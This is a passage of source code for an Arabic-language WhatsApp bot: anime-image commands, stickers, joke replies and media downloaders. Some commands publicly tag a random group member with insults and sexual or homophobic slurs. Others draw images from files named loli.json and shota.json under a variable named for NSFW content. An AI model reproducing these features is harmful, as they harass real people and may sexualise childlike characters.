            await ElgazarBot.sendMessage(m.chat, buttonszzsx127Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animepoke':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/poke`)
                           var wbuttszz128ss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next ✨`}, type: 1},
        ]
      let buttonszzsx128Messages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttszz128ss,
      headerType: 4
      }     
            await ElgazarBot.sendMessage(m.chat, buttonszzsx128Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animesmile':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/smile`)
                           var wbuttszz129ss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next ✨`}, type: 1},
        ]
      let buttonszzsx129Messages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttszz129ss,
      headerType: 4
      }     
            await ElgazarBot.sendMessage(m.chat, buttonszzsx129Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animewave':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/wave`)
                           var wbuttszz1210ss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next ✨`}, type: 1},
        ]
      let buttonszzsx1210Messages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttszz1210ss,
      headerType: 4
      }     
            await ElgazarBot.sendMessage(m.chat, buttonszzsx1210Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animeawoo':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/awoo`)
                           var wbuttszz1211ss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next ✨`}, type: 1},
        ]
      let buttonszzsx1211Messages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttszz1211ss,
      headerType: 4
      }     
            await ElgazarBot.sendMessage(m.chat, buttonszzsx1211Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animeblush':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/blush`)
                           var wbuttszz1212ss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next ✨`}, type: 1},
        ]
      let buttonszzsx1212Messages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttszz1212ss,
      headerType: 4
      }     
            await ElgazarBot.sendMessage(m.chat, buttonszzsx1212Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animesmug':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/smug`)
                           var wbuttszz1213ss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next ✨`}, type: 1},
        ]
      let buttonszzsx1213Messages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttszz1213ss,
      headerType: 4
      }     
            await ElgazarBot.sendMessage(m.chat, buttonszzsx1213Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animeglomp':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/glomp`)
                           var wbuttszz1214ss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next ✨`}, type: 1},
        ]
      let buttonszzsx1214Messages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttszz1214ss,
      headerType: 4
      }     
            await ElgazarBot.sendMessage(m.chat, buttonszzsx1214Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animehappy':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/happy`)
                           var wbuttszz1215ss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next ✨`}, type: 1},
        ]
      let buttonszzsx1215Messages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttszz1215ss,
      headerType: 4
      }     
            await ElgazarBot.sendMessage(m.chat, buttonszzsx1215Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animedance':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/dance`)
                           var wbuttszz1216ss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next ✨`}, type: 1},
        ]
      let buttonszzsx1216Messages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttszz1216ss,
      headerType: 4
      }     
            await ElgazarBot.sendMessage(m.chat, buttonszzsx1216Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animecringe':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/cringe`)
                           var wbuttszz1217ss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next ✨`}, type: 1},
        ]
      let buttonszzsx1217Messages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttszz1217ss,
      headerType: 4
      }     
            await ElgazarBot.sendMessage(m.chat, buttonszzsx1217Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break

case 'طرد':
if (!text) return m.reply(`هذا الامر معطل لانه يحظر رقم البوت🚫`)
break

case 'animehighfive':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/highfive`)
                           var wbuttszz1218ss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next ✨`}, type: 1},
        ]
      let buttonszzsx1218Messages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttszz1218ss,
      headerType: 4
      }     
            await ElgazarBot.sendMessage(m.chat, buttonszzsx1218Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animehandhold':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/handhold`)
                           var wbuttszz1219ss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next ✨`}, type: 1},
        ]
      let buttonszzsx1219Messages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttszz1219ss,
      headerType: 4
      }     
            await ElgazarBot.sendMessage(m.chat, buttonszzsx1219Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animemegumin':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/megumin`)
                           var wbuttszz1220ss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next ✨`}, type: 1},
        ]
      let buttonszzsx1220Messages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttszz1220ss,
      headerType: 4
      }     
            await ElgazarBot.sendMessage(m.chat, buttonszzsx1220Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'كاكا':  
m.reply(mess.wait)						
                    ud = await axios.get('https://waifu.pics/api/sfw/shinobu')
var wbutsss = [
    {buttonId: `.كاكا`, buttonText: {displayText: `التالي ✨`}, type: 1},
         ]
      let buttonsesMessage = {
      image: {url:ud.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
          buttons: wbutsss,
     headerType: 4
                      }
await ElgazarBot.sendMessage(m.chat,buttonsesMessage, { quoted:m }).catch(err => {
     return('Error!')
    })               
break
case 'جراي':
m.reply(mess.wait)						
                    ud = await axios.get('https://waifu.pics/api/sfw/megumin')
var wbutsss = [
    {buttonId: `.جراي`, buttonText: {displayText: `التالي ✨`}, type: 1},
         ]
      let buttonzMessage = {
      image: {url:ud.data.url},
       caption:  `خد اهي✨!`,
      footer: `${global.botname}`,
          buttons: wbutsss,
     headerType: 4
                      }
await ElgazarBot.sendMessage(m.chat,buttonzMessage, { quoted:m }).catch(err => {
     return('Error!')
    })               
break     
case 'مينيتوكيو':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://waifu.pics/api/sfw/awoo`)
 var wbuttsss = [
    {buttonId: `.${command}`, buttonText: {displayText: `التالي ✨`}, type: 1},
    ]
  let button1Messages = {
   image: {url:waifudd.data.url},
   caption:  `خد اهي✨!`,
   footer: `${global.botname}`,
  buttons: wbuttsss,
  headerType: 2
  }       
            await ElgazarBot.sendMessage(m.chat, button1Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'لولي':
if (!m.isGroup) return m.reply(mess.group)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "التالي➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/anime/loli.json'))
var xeonyresult = pickRandom(ahegaonsfw)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'تانجيرو':
if (!m.isGroup) return m.reply(mess.group)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "التالي➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/anime/husbu.json'))
var xeonyresult = pickRandom(ahegaonsfw)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'نيكو':
if (!m.isGroup) return m.reply(mess.group)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "التالي➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/anime/neko.json'))
var xeonyresult = pickRandom(ahegaonsfw)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'randomanime':
if (!m.isGroup) return m.reply(mess.group)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/anime/random.json'))
var xeonyresult = pickRandom(ahegaonsfw)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'ريكا':
if (!m.isGroup) return m.reply(mess.group)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "التالي➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/anime/shota.json'))
var xeonyresult = pickRandom(ahegaonsfw)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'وايفي':
if (!m.isGroup) return m.reply(mess.group)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "التالي➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/anime/waifu.json'))
var xeonyresult = pickRandom(ahegaonsfw)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'genshin':
try {
if (!text) throw `Which genshin are you lookin for?`
const genshin = require("genshin-api")
a = text.toLowerCase();
const anime = await genshin.Characters(text)
let txt = ""
txt += `🎀 *Name:* ${anime.name}\n`
txt += `🎖️ *Title:* ${anime.title}\n`
txt += `💠 *Vision:* ${anime.vision}\n`
txt += `🏹 *Weapon:* ${anime.weapon}\n`
txt += `💮 *Gender:* ${anime.gender}\n`
txt += `🌏 *Nation:* ${anime.nation}\n`
txt += `🪷 *Affiliation:* ${anime.affiliation}\n`
txt += `🌟 *Rarity:* ${anime.rarity}\n`
txt += `❄️ *Constellation:* ${anime.constellation}\n`
txt += `📖 *Description:* ${anime.description}\n`
txt += `🌐 *Url:* https://genshin-impact.fandom.com/wiki/${a}\n`
urll = `https://api.genshin.dev/characters/${a}/portrait`
await ElgazarBot.sendMessage(m.chat,{image:{url:urll}, caption:txt},{quoted:m})
} catch (err) {
console.log(err)
throw mess.error
}
break
case 'انمي':
if (!text) throw `اكتب اسم الانمي الذي تبحث عنه بالانقلش?`
const malScraper = require('mal-scraper')
        const anime = await malScraper.getInfoFromName(text).catch(() => null)
        if (!anime) throw `Could not find`
let animetxt = `
🎀 *العنوان: ${anime.title}*
🎋 *كتابه: ${anime.type}*
🎐 *عرض لأول مرة في: ${anime.premiered}*
💠 *مجموع الحلقات: ${anime.episodes}*
📈 *الحاله: ${anime.status}*
💮 *الأنواع: ${anime.genres}
📍 *استوديو: ${anime.studios}*
🌟 *النتيجه: ${anime.score}*
💎 *التقييم: ${anime.rating}*
🏅 *الرتبه: ${anime.ranked}*
💫 *الشعبيه: ${anime.popularity}*
♦️ *جرار: ${anime.trailer}*
🌐 *الرابط: ${anime.url}*
❄ *الوصف:* ${anime.synopsis}*`
                await ElgazarBot.sendMessage(m.chat,{image:{url:anime.picture}, caption:animetxt},{quoted:m})
                break
case 'patrick':
case 'patricksticker': {
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/patrick')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await ElgazarBot.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break
case 'ttp': {
           if (!text) return m.reply(`*Example : ${prefix + command} hello*`)
           await ElgazarBot.sendMedia(m.chat, `https://cililitan.herokuapp.com/api/texttopng2?teks=${text}`, 'A L Y A', 'B O T M D', m, {asSticker: true})
         
                     }
                     break
case 'dogesticker':
case 'dogestick':
	case 'doge':{
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/doge')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await ElgazarBot.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break
case 'lovesticker':
case 'lovestick' :{
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/love')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await ElgazarBot.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break
case 'gura':
case 'gurastick':{
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/gura')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await ElgazarBot.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break
            case 'can': {
            	if (!text) throw `Ask question\n\nExample : ${prefix + command} i dance?`
            	let bisa = [`Can`,`Can't`,`Cannot`,`Of Course You Can!!!`]
                let keh = bisa[Math.floor(Math.random() * bisa.length)]
                let jawab = `*Can ${text}*\nAnswer : ${keh}`
                let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: 'PATIENT 👀' }, type: 1 }]
            await ElgazarBot.sendButtonText(m.chat, buttons, jawab, botname, m)
            }
            break
            case 'is': {
            	if (!text) throw `Ask question\n\nExample : ${prefix + command} she virgin?`
            	let apa = [`Yes`, `No`, `It Could Be`, `Thats right`]
                let kah = apa[Math.floor(Math.random() * apa.length)]
                let jawab = `*Is ${text}*\nAnswer : ${kah}`
                let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: 'HAHAHA' }, type: 1 }]
            await ElgazarBot.sendButtonText(m.chat, buttons, jawab, botname, m)
            }
            break
            case 'when': {
            	if (!text) throw `Ask question\n\nExample : ${prefix + command} will i get married?`
            	let kapan = ['5 More Days', '10 More Days', '15 More Days','20 More Days', '25 More Days','30 More Days','35 More Days','40 More Days','45 More Days','50 More Days','55 More Days','60 More Days','65 More Days','70 More Days','75 More Days','80 More Days','85 More Days','90 More Days','100 More Days','5 Months More', '10 Months More', '15 Months More','20 Months More', '25 Months More','30 Months More','35 Months More','40 Months More','45 Months More','50 Months More','55 Months More','60 Months More','65 Months More','70 Months More','75 Months More','80 Months More','85 Months More','90 Months More','100 Months More','1 More Year','2 More Years','3 More Years','4 More Years','5 More Years','Tomorrow','The Day After Tomorrow']
                let koh = kapan[Math.floor(Math.random() * kapan.length)]
                let jawab = `*${command} ${text}*\nAnswer : ${koh}`
                let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: 'PATIENT 👀' }, type: 1 }]
            await ElgazarBot.sendButtonText(m.chat, buttons, jawab, botname, m)
            }
            break
case 'what': {
            	if (!text) throw `Ask question\n\nExample : ${prefix + command} is your name?`
            	let lel = [`Ask Your Gf`, `I Dont Know`, `I Don't Know, Ask Your Father`]
                let kah = lel[Math.floor(Math.random() * lel.length)]
                let jawab = `*What ${text}*\nAnswer : ${kah}`
                let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: 'HAHAHA' }, type: 1 }]
            await ElgazarBot.sendButtonText(m.chat, buttons, jawab, botname, m)
            }
            break
case 'where': {
            	if (!text) throw `Ask question\n\nExample : ${prefix + command} is your name?`
            	let wherelol = [`In the mountain`, `On mars`, `On moon`,`In the jungle`,`I dont know ask your mom`,`It could be somewhere`]
                let kah = wherelol[Math.floor(Math.random() * wherelol.length)]
                let jawab = `*Whwre ${text}*\nAnswer : ${kah}`
                let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: 'HAHAHA' }, type: 1 }]
            await ElgazarBot.sendButtonText(m.chat, buttons, jawab, botname, m)
            }
            break
case 'how': {
            	if (!text) throw `Ask question\n\nExample : ${prefix + command} to date girl?`
            	let gimana = [`Ummm...`, `It's Difficult Bro`, `Sorry Bot Can't Answer`, `Try Searching On Google`,`Holy Cow! Really???`,`Dizzy Ah😴, don't wanna answer`,`Ohhh I See:(`,`The Patient, Boss:(`,`Really dude 🙄`]
                let kah = gimana[Math.floor(Math.random() * gimana.length)]
                let jawab = `*How ${text}*\nAnswer : ${kah}`
                let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: 'HAHAHA' }, type: 1 }]
            await ElgazarBot.sendButtonText(m.chat, buttons, jawab, botname, m)
            }
            break
case 'الغباء': {
            	if (!text) throw `مثال : ${prefix + command} عبدالله`
            	let ra = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
                let kah = ra[Math.floor(Math.random() * ra.length)]
                let jawab = `*الاسم ${text}*\nالاجابه : ${kah}%`
                let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: '😂​💔' }, type: 1 }]
            await ElgazarBot.sendButtonText(m.chat, buttons, jawab, botname, m)
            }
            break
case 'بوت': {
            	let lowq = `*انا متصل يعم متصدعناش🤺:*\n*${runtime(process.uptime())}*`
                let buttons = [{ buttonId: 'menu', buttonText: { displayText: 'الاوامر' }, type: 1 }]
                await ElgazarBot.sendButtonText(m.chat, buttons, lowq, botname, m, {quoted: fkontak})
            	}
            break
case 'الحب':
				if (!text) return m.reply(`منشن علي شخص, مثال : ${prefix + command} @abdallah`)
					const gan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const teng = gan[Math.floor(Math.random() * gan.length)]
ElgazarBot.sendMessage(from, { text: `*${command}*\n\nالاسم : ${q}\nالاجابه : *${teng}%*` }, { quoted: m })

					break
case 'الكره':
				if (!text) return m.reply(`منشن علي شخص, مثال : ${prefix + command} @abdallah`)
					const can = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const tik = can[Math.floor(Math.random() * can.length)]
ElgazarBot.sendMessage(from, { text: `*${command}*\n\nالاسم : ${q}\nالاجابه : *${tik}%*` }, { quoted: m })
					break
					case 'شخصيتك':
					if (!text) return m.reply(`منشن علي شخص, مثال : ${prefix + command} @abdallah`)
					const xeony =['زفت','واطي','غبي','مطيع','غلبان','جدع','طيب','حبوب','جميل','حمار','محترم','شرموط','كلب','ورع']
					const taky = xeony[Math.floor(Math.random() * xeony.length)]
					ElgazarBot.sendMessage(from, { text: `التحقق من الشخصيه : ${q}\nالاجابه : *${taky}*` }, { quoted: m })
				     break
                    case 'تتتتتتتتت':
  case 'greatcheck':
    case 'gaycheck':
      case 'cutecheck':
        case 'lesbicheck':
          case 'lesbiancheck':
             case 'hornycheck':
                 case 'prettycheck':
                    case 'lovelycheck':
                      case 'uglycheck':
				if (!text) return m.reply(`منشن علي شخص, مثال : ${prefix + command} @abdallah`)
					const sangeh = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
ElgazarBot.sendMessage(from, { text: `*${command}*\n\nالاسم : ${q}\nالاجابه : *${sange}%*` }, { quoted: m })
					break
                    case 'احمق':
      case 'بشع':
      case 'جبان':
      case 'جميل':
      case 'حزين':
      case 'حمار':
      case 'خروف':
      case 'ذكي':
      case 'رقاص':
      case 'زفت':
      case 'سافل':
      case 'شجاع':
      case 'صادق':
      case 'صنم':
      case 'طيب':
      case 'ظالم':
      case 'عاقل':
      case 'غامض':
      case 'غبي':
      case 'قرد':
      case 'كاذب':
      case 'كريه':
      case '>':
      case 'ماباع':
      case 'مجنون':
      case 'محبوب':
      case 'محترم':
      case 'محتال':
      case 'مخادع':
      case 'مخدوع':
      case 'مسكين':
      case 'مستفز':
      case 'مضحك':
      case 'مظلوم':
      case 'مكروه':
      case 'مؤدب':
      case 'نجس':
      case 'وصخ':
      case 'ورع':
      case 'شاذ':
      case 'علق':
      case 'متناك':
      case 'خول':
      case 'وسخ':
      case 'مكروف':
      case 'هطف':
      case 'اهبل':
      case 'معرص':
      case 'عبقري':
      case 'اهطل': {
            if (!m.isGroup) return m.reply(`${mess.group}`)
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `هذا الشخص اكبر *${command}* في الجروب @${jodoh.split('@')[0]}`
            let ments = [me, jodoh]
            let buttons = [
                        { buttonId: 'oke', buttonText: { displayText: 'اتفق😂💔' }, type: 1 }
                    ]
                    await ElgazarBot.sendButtonText(m.chat, buttons, jawab, botname, m, {mentions: ments})
            }
            break
case 'id':{
            m.reply(from)
           }
          break
case 'toqr':{
  if (!q) return m.reply(' Please include link or text!')
   let qyuer = await qrcode.toDataURL(q, { scale: 35 })
   let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
   let buff = getRandom('.jpg')
   await fs.writeFileSync('./'+buff, data)
   let medi = fs.readFileSync('./' + buff)
  await ElgazarBot.sendMessage(from, { image: medi, caption:"Here you go!"}, { quoted: m })
   setTimeout(() => { fs.unlinkSync(buff) }, 10000)
  }
  break
case 'ig': case 'instagram': case 'انستجرام':{ //credit: Ray Senpai ❤️ https://github.com/EternityBots/Nezuko
if (args.length === 0) throw `أين الرابط?\nارسل ${prefix + command} والرابط`
        let urlInsta = args[0];
        if (!(urlInsta.includes("instagram.com/p/") ||
            urlInsta.includes("instagram.com/reel/") ||
            urlInsta.includes("instagram.com/tv/")))
            return ElgazarBot.sendMessage(
                m.chat,
                { text: `الرابط الذي قدمته ليس رابط انستجرام` },
                { quoted: m }
            );      
            if (urlInsta.includes("?"))
            urlInsta = urlInsta.split("/?")[0];
        console.log(urlInsta);
        ig.fetchPost(urlInsta).then((res) => {
            if (res.media_count == 1) {
                if (res.links[0].type == "video") {
                    ElgazarBot.sendMessage(
                        m.chat,
                        {
                            video: { url: res.links[0].url }
                        },
                        { quoted: m }
                    )
                }else if (res.links[0].type == "image") {
                    ElgazarBot.sendMessage(
                        m.chat,
                        {
                            image: { url: res.links[0].url }
                        },
                        { quoted: m }
                    )
                }
            }
            else if (res.media_count > 1) {
                for (let i = 0; i < res.media_count; i++) {
                    if (res.links[i].type == "video") {
                        ElgazarBot.sendMessage(
                            m.chat,
                            {
                                video: { url: res.links[i].url }
                            },
                            { quoted: m }
                        )
                    } else if (res.links[i].type == "image") {
                        ElgazarBot.sendMessage(
                            m.chat,
                            {
                                image: { url: res.links[i].url }
                            },
                            { quoted: m }
                        )
                    }
                }
            }            
        }).catch((error) => {
            console.log(error);
            ElgazarBot.sendMessage(m.chat, { text: `يجب أن يكون خاصًا أو غير متاح` }, { quoted: m })
        });
}
break
case 'spotify': //credit: Ray Senpai❤️ https://github.com/EternityBots/Nezuko
if (!text) return m.reply(`Where is the link?`)
        const Spotify = require('./lib/spotify')
        const spotify = new Spotify(text)
        const info = await spotify.getInfo()
        if ((info).error) throw `The link you provided is not spotify link`
        const { name, artists, album_name, release_date, cover_url } = info
        const details = `${themeemoji} *Title:* ${name || ''}\n${themeemoji} *Artists:* ${(artists || []).join(
            ','
        )}\n${themeemoji} *Album:* ${album_name}\n${themeemoji} *Release Date:* ${release_date || ''}`
       const response = await ElgazarBot.sendMessage(m.chat, { image: { url: cover_url }, caption: details }, { quoted: m })
        const bufferpotify = await spotify.download()
        await ElgazarBot.sendMessage(m.chat, { audio: bufferpotify }, { quoted: response })
break
case 'reddit': //credit: Ray Senpai ❤️ https://github.com/EternityBots/Nezuko
if (!text) throw `Where is the subreddit name?`
const RedditImageFetcher = require("reddit-image-fetcher")
RedditImageFetcher.fetch({
            type: 'custom',
            total: 1, 
            addSubreddit:text,
        }).then(result => {
            console.log(result);
            let akusingle = result[0]
            ElgazarBot.sendMessage(m.chat,{image:{url:akusingle.image}},{quoted:m})
        })
        .catch(err => {
            m.reply ("Not found!")
        })
        break
case 'define': //credit: Ray Senpai ❤️ https://github.com/EternityBots/Nezuko
if (!q) throw `What do you want to define?`
try {
targetfine = await axios.get(`http://api.urbandictionary.com/v0/define?term=${q}`)
if (!targetfine) throw mess.error
const reply = `
*${themeemoji} Word:* ${q}
*${themeemoji} Definition:* ${targetfine.data.list[0].definition
    .replace(/\[/g, "")
    .replace(/\]/g, "")}
*${themeemoji} Example:* ${targetfine.data.list[0].example
    .replace(/\[/g, "")
    .replace(/\]/g, "")}`
   ElgazarBot.sendMessage(m.chat,{text:reply},{quoted:m})
} catch (err) {
    console.log(err)
    return m.reply (`*${q}* isn't a valid text`)
    }
    break
case 'السورس': case 'script': {
teks = `⋆ تم تطوير وبرمجه هذا السورس •
⋆ بواسطه عبدالله محمد •
⋆ يمكنك التواصل مع المبرمج عبر التيلجرام ⤌⤈
 t.me/A_M_030
تبعني عبر اليوتيوب ⤌⤈
https://youtube.com/@ABDALLAH_MOHAMED
واشترك وفعل الجرس وانتظر شروحات للبرمجه..🌍🔥`
let buttons = [
{buttonId: `owner`, buttonText: {displayText: 'المطور👤'}, type: 1}
]
let buttonMessage = {
image: {url: `https://telegra.ph/file/e6259010eb14f0e5fb98d.jpg`},
jpegThumbnail: log0,
caption: teks,
footer: `${botname}`,
buttons: buttons,
headerType: 4,
contextInfo:{externalAdReply:{
title:"ᴇʟɢᴀᴢᴀʀ ʙᴏт",
body: "سورس الجزار", 
thumbnail: fs.readFileSync("XeonMedia/theme/cheemspic.jpg"),
mediaType:1,
mediaUrl: 'https://telegra.ph/file/e6259010eb14f0e5fb98d.jpg',
sourceUrl: "https://telegra.ph/file/e6259010eb14f0e5fb98d.jpg"
}}
}
ElgazarBot.sendMessage(m.chat, buttonMessage, { quoted: m })
}
            break
            
case 'التنصيب': case 'التسجيل': {
teks = `• مرحبا ياروحي ⤌⤈       
𓆩 *${pushname}* 𓆪
• انا بوت واتس اسمي ⤌⤈
𓆩 *${global.botname}* 𓆪
• تم تطويري وبرمجتي •
• بواسطه عبدالله محمد •
• اذا كنت تريد صنع بوت مماثل لهذا •
يجب عليك الانظمام لهذه القناه وسماع الشروحات لتنصيب بوت وتس مثل هذا البوت
 
قناة برمجه الجزار للشروحات
https://youtube.com/@ABDALLAH_MOHAMED

لينك شاتي 
https://api.whatsapp.com/send?phone=+201098906252`
let buttons = [
{buttonId: `owner`, buttonText: {displayText: 'المطور👤'}, type: 1}
]
let buttonMessage = {
image: {url: `https://telegra.ph/file/e6259010eb14f0e5fb98d.jpg`},
jpegThumbnail: log0,
caption: teks,
footer: `${botname}`,
buttons: buttons,
headerType: 4,
contextInfo:{externalAdReply:{
title:"ᴇʟɢᴀᴢᴀʀ ʙᴏт",
body: "سورس الجزار", 
thumbnail: fs.readFileSync("XeonMedia/theme/cheemspic.jpg"),
mediaType:1,
